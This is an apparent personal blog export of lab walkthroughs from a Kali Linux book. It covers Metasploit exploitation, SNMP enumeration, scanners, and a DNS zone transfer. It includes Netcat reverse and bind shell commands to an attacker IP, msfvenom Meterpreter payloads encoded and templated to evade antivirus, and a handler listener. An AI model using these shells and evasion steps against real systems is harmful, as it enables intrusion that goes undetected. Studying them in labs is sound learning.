. . . . . . . . . : Saturday, May 04, 2024 10:35:24 PM Default Gateway . . . . . . . . . : DHCP Server . . . . . . . . . . . : 10.11.12.1 DHCPv6 IAID . . . . . . . . . . . : 319291431 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8 DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1 fec0:0:0:ffff::2%1 fec0:0:0:ffff::3%1 NetBIOS over Tcpip. . . . . . . . : Enabled Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter Physical Address. . . . . . . . . : 08-00-27-D7-CC-D8 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11(Preferred) IPv4 Address. . . . . . . . . . . : 172.30.1.21(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, May 04, 2024 10:15:28 PM Lease Expires . . . . . . . . . . : Saturday, May 04, 2024 10:35:28 PM Default Gateway . . . . . . . . . : DHCP Server . . . . . . . . . . . : 172.30.1.1 DHCPv6 IAID . . . . . . . . . . . : 235405351 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2B-A8-88-83-08-00-27-D7-CC-D8 DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1 fec0:0:0:ffff::2%1 fec0:0:0:ffff::3%1 NetBIOS over Tcpip. . . . . . . . : Enabled Tunnel adapter isatap.{13E679E5-F4ED-4489-A265-22795E3ACF25}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Microsoft ISATAP Adapter Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Tunnel adapter isatap.{6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6}: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2 Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes 7.2 Exploit winrm with MSF #\rVery simple for this version of winrm, load MSF module windows/winrm/winrm_script_exec and fill options: result:\nBruh we need a lil break from all this talk of computers, lets drink something Ꮚ˘ꍓ˘Ꮚ That feels much better, just a few more and we\u0026rsquo;re done, thank you for hanging in there even if you don\u0026rsquo;t fully understand, I\u0026rsquo;m just glad you\u0026rsquo;re reading this.\n8. Exploiting Simple Network Management Protocol SNMP with MSF #\rIT professionals will always look for innovative solutions to monitor assets on a network such as clients, servers, network devices. This is where SNMP comes in as it is a very popular networking protocol that allows them to do just that in an easy manner, it utilises User Datagram Protocol (UDP)\nPerforming an Nmap scan for both UDP and TCP on the common port of 161: $ sudo nmap -sU -sT -p U:161,T:161 172.30.1.21 Load MSF and the module scanner/snmp/snmp_enum Results:\n[+] 172.30.1.21, Connected. [*] System information: Host IP : 172.30.1.21 Hostname : vagrant-2008R2 Description : Hardware: Intel64 Family 6 Model 158 Stepping 10 AT/AT COMPATIBLE - Software: Windows Version 6.1 (Build 7601 Multiprocessor Free) Contact : - Location : - Uptime snmp : 00:44:55.75 Uptime system : 00:44:40.24 System date : 2024-5-4 23:00:14.2 [*] User accounts: [\u0026#34;sshd\u0026#34;] [\u0026#34;Guest\u0026#34;] [\u0026#34;greedo\u0026#34;] [\u0026#34;vagrant\u0026#34;] [\u0026#34;han_solo\u0026#34;] [\u0026#34;kylo_ren\u0026#34;] [\u0026#34;boba_fett\u0026#34;] [\u0026#34;chewbacca\u0026#34;] [\u0026#34;ben_kenobi\u0026#34;] [\u0026#34;jabba_hutt\u0026#34;] [\u0026#34;artoo_detoo\u0026#34;] [\u0026#34;c_three_pio\u0026#34;] [\u0026#34;darth_vader\u0026#34;] [\u0026#34;leia_organa\u0026#34;] [\u0026#34;sshd_server\u0026#34;] [\u0026#34;jarjar_binks\u0026#34;] [\u0026#34;Administrator\u0026#34;] [\u0026#34;luke_skywalker\u0026#34;] [\u0026#34;anakin_skywalker\u0026#34;] [\u0026#34;lando_calrissian\u0026#34;] [*] Network information: IP forwarding enabled : no Default TTL : 128 TCP segments received : 852430 TCP segments sent : 823689 TCP segments retrans : 0 Input datagrams : 292603 Delivered datagrams : 292896 Output datagrams : 407015 [*] Network interfaces: Interface : [ up ] Software Loopback Interface 1 Id : 1 Mac Address : ::::: Type : softwareLoopback Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (SSTP) Id : 2 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 4091 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (L2TP) Id : 3 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 1460 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (PPTP) Id : 4 Mac Address : ::::: Type : unknown Speed : 1073 Mbps MTU : 1464 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (PPPOE) Id : 5 Mac Address : ::::: Type : ppp Speed : 1073 Mbps MTU : 1494 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IPv6) Id : 6 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (Network Monitor) Id : 7 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IP) Id : 8 Mac Address : 88:e2:20:52:41:53 Type : ethernet-csmacd Speed : 1073 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ down ] RAS Async Adapter Id : 9 Mac Address : 20:41:53:59:4e:ff Type : ppp Speed : 0 Mbps MTU : 0 In octets : 0 Out octets : 0 Interface : [ up ] WAN Miniport (IKEv2) Id : 10 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1480 In octets : 0 Out octets : 0 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter Id : 11 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Microsoft ISATAP Adapter Id : 12 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1280 In octets : 0 Out octets : 0 Interface : [ up ] Microsoft ISATAP Adapter #2 Id : 13 Mac Address : 00:00:00:00:00:00 Type : unknown Speed : 0 Mbps MTU : 1280 In octets : 0 Out octets : 0 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2 Id : 14 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter-QoS Packet Scheduler-0000 Id : 15 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter-WFP LightWeight Filter-0000 Id : 16 Mac Address : 08:00:27:d7:cc:d8 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 44474455 Out octets : 33542944 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2-QoS Packet Scheduler-0000 Id : 17 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 Interface : [ up ] Intel(R) PRO/1000 MT Desktop Adapter #2-WFP LightWeight Filter-0000 Id : 18 Mac Address : 08:00:27:66:c5:26 Type : ethernet-csmacd Speed : 1000 Mbps MTU : 1500 In octets : 6452 Out octets : 41251 9. Watering hole attacks #\rThis section is more of a way to infect employees that work at an unpenetrable organisation which have though of every firewall technique and built up a wall so strong that it seems impossible to get in.\nThis is similar to medival times where the kings will build the best defense with water around the castle with a drop gate, have guards monitor day and night on the lookout for any wanderers to protect their people.\nA technique to get in would be to just sit and wait for someone to leave the castle to buy things at the markets outside the castle because the king charges too much for a coffee. You would wait until they\u0026rsquo;re distracted and go behind them in the shadows while they head back inside the castle.\nIn the Cyber World this is known as a watering hole attack which finds a tiny hole in the wall and go all in. This can be done by infecting a public wifi network e.g. coffee shops, bakeries, Mc Donalds and wait for them to connect which will allow us to plant a payload to be executed inside the organisation and boom, I\u0026rsquo;m sorry buts it\u0026rsquo;s already over from there.\n10. Conclusion #\rWell that\u0026rsquo;s enough of me yappin about computers, this book series is realy enjoyable and once I\u0026rsquo;m completed I will through myself in the trenches of the Wire in hopes to get better to defend the innocents against the Black Hat which their sole purpose on this earth is to wreak havoc.\nMotivated by Money, Power, Radical political views, extreme methods to spread word. They opperate underground, unreachable from the real world where they piggy back off Hostpitals, Charities, small start-ups, vulnerable people and even lost pet posters that offer a rewards for finding the pet. These are people that have their brain and \u0026ldquo;souls\u0026rdquo; fogged with these motives which bring a disgrace to humanity.\nThey may have reasons to do these things such as to provide for families but shutting down hostpitals, calling lost pet owners to send money to a wallet otherwise they won\u0026rsquo;t release their \u0026ldquo;found\u0026rdquo; lost pet is crossing the line. There are better ways to make money and just know, The internet never forgets and we will find you, just a matter of when.\nOoooooookkkkk that went a little dark ∩｡• ᵕ •｡∩ ♡\nUrm just wanted to say that if you\u0026rsquo;re reading this there will be more, I am starting to like this blog thing. It started out as a portfolio in Part 1 but it felt boring so I just started writing what I wanted. It feels freeing and actualy fun to learn again, you can do it with almost all discipline just add a bit of creativity in your work and be grateful for where you are currently in time.\nThis is too long I should shut up now, see you in the next one.\n","date":"11 Jun, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/","section":"Blog","summary":"","title":"Kali Linux Part 6: All on Networking Penetration Baby","type":"posts"},{"content":"","date":"11 Jun, 2024","externalUrl":null,"permalink":"/tags/password-attacks/","section":"Tags","summary":"","title":"Password-Attacks","type":"tags"},{"content":"Lets talk Networking and Shells! I will be exploring Netcat to create connections between my Kali machine and a victim Windows machine. Will also be going over Anti-malware evasion techniques to reduce Virustotal scores when scanning payloads created using scripts. And finally test out my wireless adapter that I got for cheap for packet injection and Monitor mode compatibility with Aireplay-ng.\nThis ones a short one guys so I\u0026rsquo;ll give it my best, I know I\u0026rsquo;m only using scripts and pre-made tools yet and not reversing engineering yet but put a bit of trust in me. I have a small flame inside of me, waiting for small chips of wood to be thrown inside to grow bigger into a roaring flame to not only light up my path in dark times but also for others I care about around me.\n1. Fundamentals of Bind and Reverse Shells #\rA reverse shell is a one way connection from the victim -\u0026gt; attacker, from there they would be able to perform remote code execution or monitor for the victims behaviour, keystrokes, screen sharing and more.\nA binding shell uses inbound firewall rules meaning that the connection originates from the victim -\u0026gt; attacker.\n1.2 Creating a Reverse \u0026amp; Binding Shell with Netcat #\rThere is a Windows version of Netcat on Kali at this directory /usr/share/windows-binaries which will be uploaded to the victims computer which when executed will open the shell.\nGet the file onto the victims machine, for this example we will be connected on the same network and I will be using a Python server to transfer, cd into windows-binaries and execute python3 -m http.server 8080 On victims machine in a browser: \u0026lt;kaliIP\u0026gt;:8080 Click on nc.exe as the victim and close Python web server Execute the following in a terminal on kali nc -nlvp 1234 on bob\u0026rsquo;s nc -nv \u0026lt;kaliIP\u0026gt; 1234 -e cmd.exe To create a bind shell on kali nc -nlvp 1234 -e /bin/bash and on bob\u0026rsquo;s nc -nv \u0026lt;kaliIP\u0026gt; 1234, this will allow bob to send commands to kali ik this above isn\u0026rsquo;t what I\u0026rsquo;ve talked about as I\u0026rsquo;ve lost the gif for Netcat but here is a payload created by MSF using vnc.exe ^^\n2. Anti-malware Evasion Techniques #\rMost Anti malware work in 3 main categories:\nSignature-base detection: Anti-malware software will use a database of known malicious code and compare it to scans Behavioural-based detection: This is where the actions taken by malware is monitored by being placed in a Virtual environment for changes in the system Heuristic-based: This is where the anti-malware software uses rules and algorithms to determine if malware has been detected 2.1 Encoding Payloads with MSFvenom #\rUsing the reverse shell from the Netcat shell executable I will be using MSFvenom which allows for custom payload creation via scripts. msfvenom -h # Help menu msfvenom --list payloads # Available Payload list # Create first payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload.exe 2. Putting the payload.exe file into https://www.virustotal.com will give out these detection ratings: Virustotal and other mainstream web scanners will distribute the hash of the payload:\rA way to combat my malware being known is by using a no distribution scanner. 3. Using the highest rated encoder and iterating the encoding 9 times:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload2.exe -e x86/shikata_ga_nai -i 9 Doesn\u0026rsquo;t even lower it by much\nGiving it a executable to encode with the template to mask out anti-malware signature detection msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=4444 -f exe -o payload2.exe -e x86/shikata_ga_nai -i 9 -x /etc/share/windows-binaries/whoami.exe 2.2 Using Shellter to reduce detection #\rGo through the Wine installation guide with wine32 and install Shellter with sudo apt install shellter 2.3 Using MSF to Send a Reverse Shell Attack #\rWill need to transfer file same method as transferring ncat in part 1.2 Will be using metasploitable to listen to the payload $ msfconsole msf6 \u0026gt; use exploit/multi/handler msf6 (multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 (multi/handler) \u0026gt; set LHOST \u0026lt;attacker IP\u0026gt; msf6 (multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 (multi/handler) \u0026gt; exploit (Right-click \u0026gt; Open Image in New Tab)\n3. Wireless Adaptor Setup #\rFor the final part of this section I will be testing out my wireless adapter which was bought off Aliexpress a long time ago and just resurfaced for this which I\u0026rsquo;m happy about.\n3.1 Different types of Adaptor Modes #\rThere are several modes available for a network adaptor to switch to which all have their separate purposes:\nManaged mode: The default type which will allow connections to other AP Monitor mode: This mode will allow for wireless network scanning and packet injection Repeater mode: Echo\u0026rsquo;s a WiFi connection like an extender Master mode: Allow Linux-based system to operate as APs' 3.2 Changing between Managed and Monitor Mode #\rThere are two main methods to enable monitor and switching back to managed mode:\nManually: $ ifconfig wlan0 down $ iwconfig mode monitor wlan0 $ ifconfig wlan0 up Using airmon-ng: $ airmon-ng check kill $ airmon-ng start wlan0 $ airmon-ng stop wlan0 3.3 Testing for Packet Injection Compatibility #\rOnce in monitor mode I can see if the adaptor has packet injection capabilities with aireplay-ng -9 wlan0\nWell this pretty much covers everything for the fifth part of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. This was a short one but I learned a bit on the different shell types, using encoders to mask out known exploits by anti-malware software and testing out my wireless adapter for later testing. Glad you had a good read for this one, hope you\u0026rsquo;re doing OK wherever you are. Bye. ","date":"22 May, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/","section":"Blog","summary":"","title":"Kali Linux Part 5: Understanding Reverse and Binding Shell","type":"posts"},{"content":"","date":"22 May, 2024","externalUrl":null,"permalink":"/tags/shells/","section":"Tags","summary":"","title":"Shells","type":"tags"},{"content":"","date":"26 Apr, 2024","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"OSINT","type":"tags"},{"content":"Ever wondered what would be an effective way to find vulnerabilities within your organisational systems with ease﹖ Well in this section I will be covering vulnerability scanners for overall systems and websites which provide amazing reports within minutes!\nWelcome to the fourth part of the my walkthrough of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. Ever wondered what kind of tools professional penetration testers use to discover vulnerabilities? What to do once you have scanned for technology version? Where to find critical security issues in systems? Well all that will be answered in this section.\n1. Nessus #\rNessus is a service which utilises all sort of scanning techniques and provides a central hub accessed through your browser which makes it easy to manage scans.\n1.2 How to Install Nessus on Kali #\rFirst install the deb file on Kali linux provided on Tenable Nessus official download page: https://www.tenable.com/downloads/nessus?loginAttempted=true This should be for platform Linux-Debian-amd64 Debian 10, 11, 12 / Kali Linux\nChange directory where file is download and execute the following commands: $ sudo dpkg -i Nessus-8.15.0-debian6_amd64.deb $ sudo systemctl start nessusd Go to https://kali:8834 in your browser and accept warning to enter the login portal of nessus Register for a activation code at https://www.tenable.com/products/nessus/nessus-essentials and go through the Nessus Essential installation process within the browser setup. If login page is shown instead of activation wizard setup within the web portal, use this guide to register offline:\rhttps://community.tenable.com/s/article/How-to-reset-register-your-Nessus-license-for-offline-installations?language=en_US\n1.3 Basic Scans With Nessus #\rWhen the setup is completed you will be prompted with the option to provide the program with a list of targets to scan which I\u0026rsquo;ve entered the [Win2k8 IP address from chapter 1]: This will start an automatic Basic scan which will reveal surface-level vulnerabilities which can be seen in the \u0026lsquo;My Scans\u0026rsquo; section in the navigation menu.\nWhen navigating to \u0026lsquo;New scan\u0026rsquo; Nessus will provide different types of scans to choose from ranging from full-fledged scans to specific vulnerability scans: Main types of scans: Host Discovery Basic Network Scan Advanced Scan Malware Scan The basic scan option is great to generate a quick report on surface-level vulnerabilities: I can see the different results from the basic scan which are separated into different types folders which upon clicking will reveal findings of vulnerabilities, version types and information on technology used by the target:\nHere I am looking at the Apache Tomcat folder which will provide further information as to what can be exploited along with the CVE code: A scan will provide vulnerabilities along with it Common vulnerability Score System (CVSS) out of 10 to show danger levels which can be determined by this calculator https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N 2. Making Use Of Nmap\u0026rsquo;s Scripting Engine NSE #\rFor more information check out the documentation at: https://nmap.org/book/nse.html\rNmap scripting engine is a repository of scripts which are separated into different categories which can be used along with scans to enrich the reconnaissance phase.\nThe defined categories are as followed: auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln\nSee available scripts at: https://nmap.org/nsedoc/scripts/\rnmap --script-help \u0026#34;afp-* and discovery\u0026#34; nmap --script=\u0026lt;keyword\u0026gt; nmap --script=ftp-vsftpd-backdoor 172.30.1.20 nmap --script=vuln 172.30.1.20 3. Greenbone Vulnerability Mananger GVM #\rGreenbone Community Edition has come to its end-of-life in Jan 2023 and will be fully off Docker hub by June 2024 :( See link for more details: GVM Community Edition 21.04 End of Life\rThis tool seems to be similar to nessus tool which provides lots of options for reconnaissance.\nsudo apt install gvm sudo gvm-setup sudo gvm-start sudo runuser -u _gvm -- gvmd --user=admin --new-password=new_password # reset pass When performing the setup commands for GVM you will be provided with a admin password, make a note of this as this is important as it is needed for the sign in page in your browser: Upon login in you will see the main dashboard with charts, select Configuration \u0026gt; Targets \u0026gt; New Target: After setting a target create a task in Scans \u0026gt; Tasks to perform a basic automated scan on the target you\u0026rsquo;ve set earlier 🚧 Incomplete section, need to make time to properly try GVM due to Community version loosing official support. Full installation guide here: https://forum.greenbone.net/t/greenbone-community-edition-22-4-stable-initial-release-2022-07-25/12638 🚧\n4. Using Web Application Scanners #\rScanning a machine for all possible vulnerabilities on the surface level is good but what if your target is a website? Well here I will be covering just the surface of different web application scanners which may reveal information that can be of use as a pentester.\n4.1 WhatWeb #\rWhatweb is a recon tool used to retrieve different aspect of websites such as web servers, OS, content management system and other technologies by sending HTTP request and analysing the response.\nHere is an example of it being used with whatweb \u0026lt;IP\u0026gt;: Whoah, that\u0026rsquo;s a lot of information received from just a basic scan!\nThis tool provides custom depth searches and HTTP header customisation which I will be playing with more in the future so stay tuned.\n4.2 Using NSE Web Application Scanning Scripts #\rIf you remember from earlier we looked at Nmap\u0026rsquo;s scripting engine which provided a huge library of ready-to-use battle scripts for both recon and exploitation.\nTo look at the scripts available for web application you can use pattern search to list what\u0026rsquo;s out there with\n$ ls /usr/share/nmap/scripts/http* Here are some of the results for http result alone!\n/usr/share/nmap/scripts/http-open-redirect.nse /usr/share/nmap/scripts/http-passwd.nse /usr/share/nmap/scripts/http-phpmyadmin-dir-traversal.nse /usr/share/nmap/scripts/http-phpself-xss.nse /usr/share/nmap/scripts/http-php-version.nse /usr/share/nmap/scripts/http-proxy-brute.nse /usr/share/nmap/scripts/http-put.nse /usr/share/nmap/scripts/http-qnap-nas-info.nse /usr/share/nmap/scripts/http-referer-checker.nse /usr/share/nmap/scripts/http-rfi-spider.nse /usr/share/nmap/scripts/http-robots.txt.nse /usr/share/nmap/scripts/http-robtex-reverse-ip.nse /usr/share/nmap/scripts/http-robtex-shared-ns.nse /usr/share/nmap/scripts/http-sap-netweaver-leak.nse /usr/share/nmap/scripts/http-security-headers.nse /usr/share/nmap/scripts/http-server-header.nse /usr/share/nmap/scripts/http-shellshock.nse /usr/share/nmap/scripts/http-sitemap-generator.nse /usr/share/nmap/scripts/http-slowloris-check.nse /usr/share/nmap/scripts/http-slowloris.nse **/usr/share/nmap/scripts/http-sql-injection.nse** /usr/share/nmap/scripts/https-redirect.nse /usr/share/nmap/scripts/http-stored-xss.nse There are so many it\u0026rsquo;s excitingly overwhelming but don\u0026rsquo;t worry, well go through one example together. I\u0026rsquo;ve highlighted one of the sql injection script near the bottom as a way to demonstrate script functions.\n# Use sql-injection detection on port 80 $ nmap --script http-sql-injection -p 80 \u0026lt;IP\u0026gt; # Use all scripts starting with \u0026#34;http-\u0026#34; $ nmap --script \u0026#34;http-*\u0026#34; -p 80 \u0026lt;IP\u0026gt; For more information check out the documentation at: https://nmap.org/book/nse.html\r4.3 Making Use Of Metasploit\u0026rsquo;s Wmap Scanning Tool #\rMetasploitable is truly the swiss army of reconnaissance and exploitation, another feature it provides are in-built plugins which provide unique functions compared to the scripts provided by MS.\nWe can load the module within MS with load wmap, if you\u0026rsquo;re curious as to what other plugins available use: load -l Set a main site to tell wmap where it should be scanning, I will be using the Broken OWASP Web application virtual machine created in the labs section:\nmsf6 \u0026gt; wmap_sites -a 172.30.1.23 Specify a directory to perform enumeration on, here I will be using the the \u0026lsquo;mutilliadae\u0026rsquo; challenge: msf6 \u0026gt; wmap_targets -t 172.30.1.23/mutilliadae/ Then perform the attack! msf6 \u0026gt; wmap_targets -l # List targets from sites msf6 \u0026gt; wmap_run -t # List all loaded modules for scans msf6 \u0026gt; wmap_run -e # Run all scans on target 4.4 Nikto #\rThis is an open-source reconnaissance tool for web vulnerabilities, it is helpful to get an overview of what technologies a website is using and potential known vulnerabilities it may have.\nGithub repo: https://github.com/sullo/nikto\rThis tool should come pre-install with Kali but if not, install it using the Github link.\n$ nikto --help # Display help menu $ nikto -h 172.30.1.23 -F csv -o ~/Desktop/result.csv # Set target and save result as csv file This reveals a lot of valuable information on systems that might have misconfigured web technologies which is worth using for a simple tool.\n4.5 WPScan for WordPress websites #\rWordPress is a framework which allows users to use as an aid for building websites which is similar to Hugo which is what my blog is using.\nWPscan is a pre-install tool on Kali for specifically scanning WordPress websites. To test this I will be using OWASP BWA machine from Part-1:\nTarget: 172.30.1.23/wordpress\n# Display help menu $ wpscan --help # Scan url with user enumeration $ wpscan --url 172.30.1.23/wordpress -e u Results from scan:\nAdmin user name login found:\nThat concludes everything for this part of The Ultimate Kali Linux Book I am reading which is exciting to go through and learn all the different types of helpful tool that I could potentially use on my Pentesting / Hacking journey. Can\u0026rsquo;t wait to see you there for the next one, cheers.\n","date":"26 Apr, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/","section":"Blog","summary":"","title":"Part 4 Performing Vulnerability Assessments","type":"posts"},{"content":"","date":"26 Apr, 2024","externalUrl":null,"permalink":"/tags/vulnerability/","section":"Tags","summary":"","title":"Vulnerability","type":"tags"},{"content":"","date":"9 Apr, 2024","externalUrl":null,"permalink":"/tags/dns/","section":"Tags","summary":"","title":"DNS","type":"tags"},{"content":"Scratching the surface of the vast world of active recon, exploring tools which provide juicy information such as nmap, metasploit, netdiscover and more.\nWelcome to the third part of the my walkthrough of ‘The Ultimate Kali Linux Book’ by Glen D. Singh, in this section I\u0026rsquo;ll be going over some active information techniques. These directly interacts with the target which is helpful at collecting juicy information such as ports which can be later on exploited for vulnerabilities and all the exciting stuff.\n1. DNS reconnaissance and zone transfers #\rWhen wanting to explore a certain website you will be likely familiar with entering it\u0026rsquo;s name known as a domain (e.g. YouTube.com) which will redirect you to its landing page.\nUnder the hood of the internet we have what\u0026rsquo;s called a domain name server which sole purpose is to take the URL you\u0026rsquo;ve typed and convert it into an IP address which a browser can understand to connect to the correct computer over the world wide web. Similar to a phone book where you\u0026rsquo;d look up the name of a person and find their dial number.\n1.2 Different types of DNS records #\rA DNS lookup tool will provide different types of records which can give valuable information to create a strong profile on a target.\nThe following are the different record types:\nA: Resolves a hostname to an IPv4 address. AAAA: Resolves a hostname to an IPv6 address. NS: Contains the name servers\u0026rsquo; information. MX: Contains the mail exchange (email) servers. PTR: Resolves an IP address to a hostname. CNAME: Provides a canonical name or an alias. RP: Specifies the person that\u0026rsquo;s responsible for the domain. SOA: Contains information about the administrator of the domain. SRV: Contains a service port number for a specific service of the domain Performing DNS enumeration techniques can provides information such as IP ranges, subdomains, email servers.\n1.3 Scanning for subdomains and name servers #\r# Display name servers (ns) using host $ host -t ns zonetransfer.me # Display subdomains using dnsmap dnsmap microsoft.com 2. Zone transfers vulnerabilities #\rSometimes when setting up a website either by hosting it yourself or going with a service provider there may be some misconfigurations such as allowing zone transfers.\nIts purpose is to allow domain server to easily transfer old records of a known URL to create redundancy incase the primary server is down. Upon request if misconfigured, the DNS will send all records it currently has on a URL which can be used to exploits other part of a target.\n2.1 Performing a zone transfer attack #\rMy target will be zonetransfer.me which has been configure to accept all zone transfer requests for demonstration purposes.\nRetrieve a name server using the [Whois tool]\nUsing the dig command on kali: dig axfr @nsztm2.digi.ninja zonetransfer.me\n; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.21-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @nsztm2.digi.ninja zonetransfer.me ; (1 server found) ;; global options: +cmd zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600 zonetransfer.me. 300 IN HINFO \u0026#34;Casio fx-700G\u0026#34; \u0026#34;Windows XP\u0026#34; zonetransfer.me. 301 IN TXT \u0026#34;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\u0026#34; zonetransfer.me. 7200 IN MX 0 ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM. zonetransfer.me. 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM. zonetransfer.me. 7200 IN A 5.196.105.14 zonetransfer.me. 7200 IN NS nsztm1.digi.ninja. zonetransfer.me. 7200 IN NS nsztm2.digi.ninja. _acme-challenge.zonetransfer.me. 301 IN TXT \u0026#34;2acOp15rSxBpyF6L7TqnAoW8aI0vqMU5kpXQW7q4egc\u0026#34; _acme-challenge.zonetransfer.me. 301 IN TXT \u0026#34;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\u0026#34; _sip._tcp.zonetransfer.me. 14000 IN SRV 0 0 5060 www.zonetransfer.me. 14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me. asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1 asfdbbox.zonetransfer.me. asfdbbox.zonetransfer.me. 7200 IN A 127.0.0.1 asfdbvolume.zonetransfer.me. 7800 IN AFSDB 1 asfdbbox.zonetransfer.me. canberra-office.zonetransfer.me. 7200 IN A 202.14.81.230 cmdexec.zonetransfer.me. 300 IN TXT \u0026#34;; ls\u0026#34; contact.zonetransfer.me. 2592000 IN TXT \u0026#34;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes\u0026#34; dc-office.zonetransfer.me. 7200 IN A 143.228.181.132 deadbeef.zonetransfer.me. 7201 IN AAAA dead:beaf:: dr.zonetransfer.me. 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m DZC.zonetransfer.me. 7200 IN TXT \u0026#34;AbCdEfG\u0026#34; email.zonetransfer.me. 2222 IN NAPTR 1 1 \u0026#34;P\u0026#34; \u0026#34;E2U+email\u0026#34; \u0026#34;\u0026#34; email.zonetransfer.me.zonetransfer.me. email.zonetransfer.me. 7200 IN A 74.125.206.26 Hello.zonetransfer.me. 7200 IN TXT \u0026#34;Hi to Josh and all his class\u0026#34; home.zonetransfer.me. 7200 IN A 127.0.0.1 Info.zonetransfer.me. 7200 IN TXT \u0026#34;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.\u0026#34; internal.zonetransfer.me. 300 IN NS intns1.zonetransfer.me. internal.zonetransfer.me. 300 IN NS intns2.zonetransfer.me. intns1.zonetransfer.me. 300 IN A 81.4.108.41 intns2.zonetransfer.me. 300 IN A 52.91.28.78 office.zonetransfer.me. 7200 IN A 4.23.39.254 ipv6actnow.org.zonetransfer.me. 7200 IN AAAA 2001:67c:2e8:11::c100:1332 owa.zonetransfer.me. 7200 IN A 207.46.197.32 robinwood.zonetransfer.me. 302 IN TXT \u0026#34;Robin Wood\u0026#34; rp.zonetransfer.me. 321 IN RP robin.zonetransfer.me. 